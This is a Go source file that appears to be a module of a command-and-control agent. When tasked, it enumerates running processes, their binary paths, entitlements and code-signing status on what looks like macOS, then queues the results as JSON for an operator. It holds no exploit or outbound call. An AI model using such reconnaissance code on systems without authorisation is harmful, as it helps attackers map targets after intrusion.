package list_entitlements

import (
	"encoding/json"
	//"fmt"
	"pkg/profiles"
	"pkg/utils/structs"
	"ps"
	"strings"
	"sync"
)

var mu sync.Mutex

type Arguments struct {
	PID int `json:"pid"`
}

type ProcessDetails struct {
	ProcessID    int    `json:"process_id"`
	Entitlements string `json:"entitlements"`
	Name         string `json:"name"`
	BinPath      string `json:"bin_path"`
	CodeSign     int    `json:"code_sign"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	var final string
	args := Arguments{}
	json.Unmarshal([]byte(task.Params), &args)
	if args.PID < 0 {
		procs, _ := ps.Processes()
		p := make([]ProcessDetails, len(procs))
		replacer := strings.NewReplacer("\n", "", "\t", "")
		for index := 0; index < len(procs); index++ {
			p[index].ProcessID = procs[index].Pid()
			p[index].Name = procs[index].Name()
			p[index].BinPath = procs[index].BinPath()
			ent, _ := listEntitlements(p[index].ProcessID)
			if ent.Successful {
				p[index].Entitlements = replacer.Replace(ent.Message)
			} else {
				p[index].Entitlements = "Unsuccessfully queried"
			}
			cs, _ := listCodeSign(p[index].ProcessID)
			p[index].CodeSign = cs.CodeSign
		}
		temp, _ := json.Marshal(p)
		final = string(temp)
	} else {
		r, _ := listEntitlements(args.PID)
		if !r.Successful {
			msg.Status = "error"
		}
		final = r.Message
	}

	msg.Completed = true
	msg.UserOutput = final
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
